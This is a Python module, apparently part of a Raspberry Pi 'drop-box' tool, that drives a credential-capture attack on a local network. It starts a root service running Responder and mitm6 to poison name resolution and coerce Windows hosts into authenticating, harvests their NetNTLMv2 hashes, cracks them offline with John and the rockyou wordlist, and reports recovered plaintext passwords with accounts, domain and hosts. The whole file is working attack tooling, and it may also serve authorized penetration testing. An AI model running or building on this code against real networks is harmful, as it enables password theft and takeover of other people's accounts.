"""Mole engine. Mole is Fennec's drop-box module: plug the Pi into a LAN over
Ethernet, start the module, and it coerces Windows hosts into authenticating to
the Pi (Responder for LLMNR/NBT-NS/mDNS poisoning, mitm6 for rogue DHCPv6/DNS),
captures their NetNTLMv2 hashes, maps the subnet, and cracks the captured hashes
offline with John. It reports recovered passwords, the accounts and domain seen,
the hosts found, and a one-line verdict.

The capture runs as root in the fennec-mole systemd service (the orchestrator
/usr/local/bin/fennec-mole). This module starts and stops that service, reads the
loot it writes under /tmp/fennec-mole, and runs the offline cracking pass.
"""
import os
import re
import json
import glob
import time
import subprocess
import threading

LOOT = "/tmp/fennec-mole"
HASHES_FILE = os.path.join(LOOT, "hashes.txt")
CRACKED_FILE = os.path.join(LOOT, "cracked.json")
HOSTS_FILE = os.path.join(LOOT, "hosts.json")
META_FILE = os.path.join(LOOT, "meta.json")

SERVICE = "fennec-mole"

# Responder writes its loot under its own install dir; the path varies by install
# (git checkout vs package), so we read from every known location.
RESPONDER_LOG_DIRS = ["/opt/Responder/logs", "/usr/share/responder/logs"]

# NetNTLMv2 cracking needs John "jumbo" (built to /opt/john by install.sh); the
# Debian "john" package lacks the netntlmv2 format. Fall back to it if jumbo is
# absent, so the engine still imports.
JOHN_BIN = "/opt/john/run/john" if os.path.exists("/opt/john/run/john") else "john"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
CRACK_MAX_SECONDS = 300

# A NetNTLMv2 line looks like:  user::DOMAIN:serverchallenge:ntproof:blob
_RE_NETNTLMV2 = re.compile(r"^([^:]+)::([^:]*):[0-9a-fA-F]+:[0-9a-fA-F]+:[0-9a-fA-F]+")

crack_state = {"running": False, "done": False, "found": 0, "started": 0,
               "error": None}
_lock = threading.Lock()


def _systemctl(action, service):
    try:
        subprocess.run(
            ["sudo", "-n", "/usr/bin/systemctl", action, service],
            check=True, capture_output=True, timeout=20,
        )
        return True
    except Exception:
        return False


def is_active():
    try:
        r = subprocess.run(
            ["systemctl", "is-active", SERVICE],
            capture_output=True, text=True, timeout=10,
        )
        return r.stdout.strip() == "active"
    except Exception:
        return False


def start():
    """Start the capture service (it clears old loot itself on launch)."""
    return _systemctl("start", SERVICE)


def stop():
    return _systemctl("stop", SERVICE)


def _read_json(path, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return default


def _hash_lines():
    """Every NetNTLMv2 line we can see, from the consolidated loot file and from
    Responder's own log directories, de-duplicated."""
    lines = set()
    sources = [HASHES_FILE]
    for d in RESPONDER_LOG_DIRS:
        sources.extend(glob.glob(os.path.join(d, "*NTLMv2*.txt")))
    for path in sources:
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if _RE_NETNTLMV2.match(line):
                        lines.add(line)
        except OSError:
            continue
    return sorted(lines)


def _accounts():
    """Captured accounts, de-duplicated by (domain, user), newest hash kept."""
    seen = {}
    for line in _hash_lines():
        m = _RE_NETNTLMV2.match(line)
        if not m:
            continue
        user = m.group(1)
        domain = m.group(2) or ""
        key = (domain.lower(), user.lower())
        seen[key] = {"user": user, "domain": domain, "hash": line}
    return list(seen.values())


def _cracked():
    """Map 'user' (lowercase) -> recovered password, from the last John pass."""
    data = _read_json(CRACKED_FILE, {})
    return {k.lower(): v for k, v in data.items()} if isinstance(data, dict) else {}


def _verdict(accounts, cracked):
    """One-line verdict, mirroring Sly's robustness score but for the LAN."""
    if any(a["user"].lower() in cracked for a in accounts):
        return {"level": "critical", "label": "Network: wide open",
                "detail": "a captured account has a weak password"}
    if accounts:
        return {"level": "warning", "label": "Credentials captured",
                "detail": "hashes caught, not cracked yet"}
    if is_active():
        return {"level": "idle", "label": "Listening",
                "detail": "no credentials captured yet"}
    return {"level": "idle", "label": "Idle", "detail": "not running"}


def snapshot():
    """JSON-able report for the Mole screen."""
    accounts = _accounts()
    cracked = _cracked()
    hosts = _read_json(HOSTS_FILE, [])
    meta = _read_json(META_FILE, {})

    out_accounts = []
    for a in accounts:
        pw = cracked.get(a["user"].lower())
        out_accounts.append({
            "user": a["user"],
            "domain": a["domain"],
            "password": pw,
            "cracked": pw is not None,
        })
    out_accounts.sort(key=lambda a: (not a["cracked"], a["domain"].lower(), a["user"].lower()))

    # Most common domain among captured accounts.
    counts = {}
    for a in accounts:
        d = a["domain"]
        if d:
            counts[d] = counts.get(d, 0) + 1
    domain = max(counts, key=counts.get) if counts else None

    return {
        "active": is_active(),
        "iface": meta.get("iface"),
        "subnet": meta.get("subnet"),
        "domain": domain,
        "accounts": out_accounts,
        "passwords": sum(1 for a in out_accounts if a["cracked"]),
        "hosts": hosts if isinstance(hosts, list) else [],
        "host_count": len(hosts) if isinstance(hosts, list) else 0,
        "verdict": _verdict(accounts, cracked),
        "cracking": crack_state["running"],
        "crack": {
            "running": crack_state["running"],
            "done": crack_state["done"],
            "found": crack_state["found"],
            "started": crack_state["started"],
            "max": CRACK_MAX_SECONDS,
            "error": crack_state["error"],
        },
    }


def _crack_worker(hash_lines):
    found = {}
    error = None
    try:
        os.makedirs(LOOT, exist_ok=True)
        with open(HASHES_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(hash_lines) + "\n")
        if not os.path.exists(WORDLIST):
            error = "wordlist missing"
        else:
            r = subprocess.run(
                [JOHN_BIN, "--format=netntlmv2", "--wordlist=" + WORDLIST,
                 "--max-run-time=" + str(CRACK_MAX_SECONDS), HASHES_FILE],
                capture_output=True, text=True, timeout=CRACK_MAX_SECONDS + 60,
            )
            if "Unknown ciphertext format" in (r.stderr + r.stdout):
                error = "needs John jumbo"
        if error is None:
            show = subprocess.run(
                [JOHN_BIN, "--show", "--format=netntlmv2", HASHES_FILE],
                capture_output=True, text=True, timeout=60,
            ).stdout
            for line in show.splitlines():
                # John --show prints:  user:password:...  (one per cracked hash)
                parts = line.split(":")
                if len(parts) >= 2 and parts[0] and parts[1]:
                    found[parts[0]] = parts[1]
            with open(CRACKED_FILE, "w", encoding="utf-8") as f:
                json.dump(found, f)
    except Exception:
        error = "crack failed"
    finally:
        with _lock:
            crack_state["running"] = False
            crack_state["done"] = True
            crack_state["found"] = len(found)
            crack_state["error"] = error


def crack():
    """Kick one offline John pass over the captured hashes (non-blocking)."""
    with _lock:
        if crack_state["running"]:
            return False
        lines = _hash_lines()
        if not lines:
            return False
        crack_state["running"] = True
        crack_state["done"] = False
        crack_state["found"] = 0
        crack_state["error"] = None
        crack_state["started"] = int(time.time())
    threading.Thread(target=_crack_worker, args=(lines,), daemon=True).start()
    return True
